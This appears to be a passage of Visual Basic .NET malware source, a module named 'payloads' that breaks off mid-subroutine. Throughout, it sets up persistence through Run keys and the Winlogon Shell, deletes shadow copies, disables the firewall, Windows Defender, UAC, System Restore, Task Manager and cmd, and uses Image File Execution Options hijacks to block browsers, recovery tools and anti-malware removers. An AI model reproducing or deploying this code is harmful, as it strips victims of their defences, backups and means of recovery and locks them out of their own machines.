Imports Microsoft.Win32

Module payloads
    Public Sub Registrys()
        My.Computer.Registry.LocalMachine.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True).SetValue(Application.ProductName, Application.ExecutablePath)
        My.Computer.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True).SetValue(Application.ProductName, Application.ExecutablePath)
        My.Computer.Registry.LocalMachine.OpenSubKey("Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run", True).SetValue(Application.ProductName, Application.ExecutablePath)
        Shell("vssadmin delete shadows /all /quiet", AppWinStyle.Hide)
        Shell("vssadmin delete shadows /all /quiet", AppWinStyle.Hide)
        Shell("vssadmin delete shadows /all /quiet", AppWinStyle.Hide)
        Shell("NetSh Advfirewall set allprofiles state off", vbHide)

        Dim RegistryKey As Object
        RegistryKey = CreateObject("WScript.Shell")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows Defender\DisableAntiSpyware", 1, "REG_DWORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows Defender\DisableRoutinelyTakingAction", 1, "REG_DWORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\WindowsDefenderMAJ", 1, "REG_DWORD")
        RegistryKey.regwrite("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\WindowsDefenderMAJ", 1, "REG_DWORD")

        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows Script Host\Settings\Enabled", 0, "REG_DWORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows Script Host\Settings\Enabled", 0, "REG_DWORD")

        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows NT\SystemRestore\DisableSR", 1, "REG_DWORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\SystemRestore\DisableSR", 1, "REG_DWORD")

        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows NT\SystemRestore\DisableConfig", 1, "REG_DWORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\SystemRestore\DisableConfig", 1, "REG_DWORD")

        RegistryKey.regwrite("HKEY_CURRENT_USER\SYSTEM\CurrentControlSet\Services\USBSTOR", 4, "REG_DWORD") 'Normally 4
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\USBSTOR", 4, "REG_DWORD") 'Normally 4

        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD")

        RegistryKey.regwrite("HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows Defender\ServiceKeepAlive", 0, "REG_DWORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\ServiceKeepAlive", 0, "REG_DWORD")

        RegistryKey.regwrite("HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates\ForceUpdateFromMU", 0, "REG_DWORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates\ForceUpdateFromMU", 0, "REG_DWORD")

        RegistryKey.regwrite("HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates\UpdateOnStartUp", 0, "REG_DWORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates\UpdateOnStartUp", 0, "REG_DWORD")

        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\DisableCMD", 2, "REG_DWORD") 'Normally 2
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\System\DisableCMD", 2, "REG_DWORD") 'Normally 2
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\DisableCMD", 2, "REG_DWORD") 'Normally 2
        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\DisableCMD", 2, "REG_DWORD") 'Normally 2
        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System\DisableCMD", 2, "REG_DWORD") 'Normally 2
        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\DisableCMD", 2, "REG_DWORD") 'Normally 2

        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\MMC\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}\Restrict_Run", 1, "REG_DWORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\MMC\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}\Restrict_Run", 1, "REG_DWORD")

        RegistryKey.regwrite("HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring", 1, "REG_DWORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring", 1, "REG_DWORD")

        RegistryKey.regwrite("HKEY_CURRENT_USER\SYSTEM\CurrentControlSet\Services\SecurityHealthService", 4, "REG_DWORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService", 4, "REG_DWORD")

        RegistryKey.regwrite("HKEY_CURRENT_USER\SYSTEM\CurrentControlSet\Services\WdNisSvc", 3, "REG_DWORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdNisSvc", 3, "REG_DWORD")
        RegistryKey.regwrite("HKEY_CURRENT_USER\SYSTEM\CurrentControlSet\Services\WinDefend", 3, "REG_DWORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDefend", 3, "REG_DWORD")

        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA", 0, "REG_DWORD")

        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoControlPanel", 1, "REG_DWORD")

        RegistryKey.regwrite("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun", 1, "REG_DWORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun", 1, "REG_DWORD")

        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 1, "REG_DWORD")
        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 1, "REG_DWORD")

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", True)
        key.SetValue("Shell", Application.ExecutablePath)
    End Sub


    Public Sub Msconfig()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msconfig.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msconfig.exe", True)
        key.SetValue("Debugger", "RIP")
         
    End Sub

    'Public Sub Explorer()
    'Dim regKey As RegistryKey
    '    regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe", RegistryKeyPermissionCheck.Default)
    '   regKey.Close()
    '
    ' Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe", True)
    '   key.SetValue("Debugger", "RIP")
    '
    'End Sub

    Public Sub Taskmgr()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe", True)
        key.SetValue("Debugger", "RIP")
         
    End Sub

    Public Sub Cmd()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmd.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmd.exe", True)
        key.SetValue("Debugger", "RIP")
         
    End Sub

    Public Sub Chrome()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chrome.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chrome.exe", True)
        key.SetValue("Debugger", "RIP")
         
    End Sub

    Public Sub Firefox()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\firefox.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\firefox.exe", True)
        key.SetValue("Debugger", "RIP")
         
    End Sub

    Public Sub Opera()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\opera.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\opera.exe", True)
        key.SetValue("Debugger", "RIP")
         
    End Sub

    Public Sub Microsoftedge()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\microsoftedge.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\microsoftedge.exe", True)
        key.SetValue("Debugger", "RIP")
         
    End Sub

    Public Sub Microsoftedgecp()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\microsoftedgecp.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\microsoftedgecp.exe", True)
        key.SetValue("Debugger", "RIP")
         
    End Sub

    Public Sub Notepad()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad++.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad++.exe", True)
        key.SetValue("Debugger", "RIP")
         
    End Sub

    Public Sub Iexplore()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iexplore.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iexplore.exe", True)
        key.SetValue("Debugger", "RIP")
         
    End Sub

    Public Sub Notepad1()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe", True)
        key.SetValue("Debugger", "RIP")
         
    End Sub

    Public Sub MSASCuiL()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MSASCuiL.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MSASCuiL.exe", True)
        key.SetValue("Debugger", "RIP")
         
    End Sub

    Public Sub Mmc()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mmc.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mmc.exe", True)
        key.SetValue("Debugger", "RIP")
         

    End Sub

    Public Sub Gpedit()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\gpedit.msc", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\gpedit.msc", True)
        key.SetValue("Debugger", "RIP")
         
    End Sub

    Public Sub UserAccountControlSettings()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\UserAccountControlSettings.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\UserAccountControlSettings.exe", True)
        key.SetValue("Debugger", "RIP")
         
    End Sub

    Public Sub Autoruns64()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Autoruns64.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Autoruns64.exe", True)
        key.SetValue("Debugger", "RIP")
         
    End Sub

    Public Sub Autoruns()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Autoruns.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Autoruns.exe", True)
        key.SetValue("Debugger", "RIP")
         
    End Sub
    Public Sub Taskkill()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskkill.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskkill.exe", True)
        key.SetValue("Debugger", "RIP")
         
    End Sub
    Public Sub Powershell()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\powershell.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\powershell.exe", True)
        key.SetValue("Debugger", "RIP")
         
    End Sub
    Public Sub Yandex()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\yandex.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\yandex.exe", True)
        key.SetValue("Debugger", "RIP")
         
    End Sub
    Public Sub Attrib()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\attrib.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\attrib.exe", True)
        key.SetValue("Debugger", "RIP")
         
    End Sub
    Public Sub Bcdedit()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\bcdedit.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\bcdedit.exe", True)
        key.SetValue("Debugger", "RIP")
         
    End Sub
    Public Sub Sethc()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe", True)
        key.SetValue("Debugger", "RIP")
         
    End Sub
    Public Sub Mspaint()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mspaint.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mspaint.exe", True)
        key.SetValue("Debugger", "RIP")

    End Sub
    Public Sub Recoverydrive()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\recoverydrive.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\recoverydrive.exe", True)
        key.SetValue("Debugger", "RIP")
         
    End Sub
    Public Sub Logoff()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\logoff.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\logoff.exe", True)
        key.SetValue("Debugger", "RIP")
         
    End Sub
    Public Sub Control()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\control.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\control.exe", True)
        key.SetValue("Debugger", "RIP")
         
    End Sub
    Public Sub RKill()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\RKill.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\RKill.exe", True)
        key.SetValue("Debugger", "RIP")
         
    End Sub
    Public Sub RKill64()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\RKill64.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\RKill64.exe", True)
        key.SetValue("Debugger", "RIP")
         
    End Sub
    Public Sub RKillunsigned()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\rkill-unsigned.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\rkill-unsigned.exe", True)
        key.SetValue("Debugger", "RIP")
         
    End Sub
    Public Sub RKillunsigned64()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\rkill-unsigned64.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\rkill-unsigned64.exe", True)
        key.SetValue("Debugger", "RIP")
         
    End Sub
    Public Sub Rstrui()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\rstrui.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\rstrui.exe", True)
        key.SetValue("Debugger", "RIP")
         
    End Sub
    ' Public Sub ExplorerAnti()
    'Dim regKey As RegistryKey
    '    regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\eXplorer.exe", RegistryKeyPermissionCheck.Default)
    '    regKey.Close()
    '
    ' Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\eXplorer.exe", True)
    '    key.SetValue("Debugger", "RIP")
    '
    ' End Sub
    'Public Sub ExplorerAnti1()
    'Dim regKey As RegistryKey
    '   regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\eXplorer64.exe", RegistryKeyPermissionCheck.Default)
    '   regKey.Close()
    '
    ' Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\eXplorer64.exe", True)
    '   key.SetValue("Debugger", "RIP")
    'End Sub
    Public Sub ExplorerAnti2()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iExplore.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iExplore.exe", True)
        key.SetValue("Debugger", "RIP")
    End Sub
    Public Sub ExplorerAnti3()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iExplore64.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iExplore64.exe", True)
        key.SetValue("Debugger", "RIP")
    End Sub
    Public Sub ExplorerAnti4()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Rkill.com", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Rkill.com", True)
        key.SetValue("Debugger", "RIP")
    End Sub
    Public Sub ExplorerAnti5()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Rkill64.com", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Rkill64.com", True)
        key.SetValue("Debugger", "RIP")
    End Sub
    Public Sub ExplorerAnti6()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Rkill.scr", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Rkill.scr", True)
        key.SetValue("Debugger", "RIP")
    End Sub
    Public Sub ExplorerAnti7()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Rkill64.scr", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Rkill64.scr", True)
        key.SetValue("Debugger", "RIP")
    End Sub
    Public Sub ExplorerAnti10()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ZAM.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ZAM.exe", True)
        key.SetValue("Debugger", "RIP")
    End Sub
    Public Sub ExplorerAnti11()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\a2start.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\a2start.exe", True)
        key.SetValue("Debugger", "RIP")

    End Sub
    Public Sub ExplorerAnti12()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mbam.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mbam.exe", True)
        key.SetValue("Debugger", "RIP")
    End Sub
    Public Sub ExplorerAnti13()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ComboFix.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

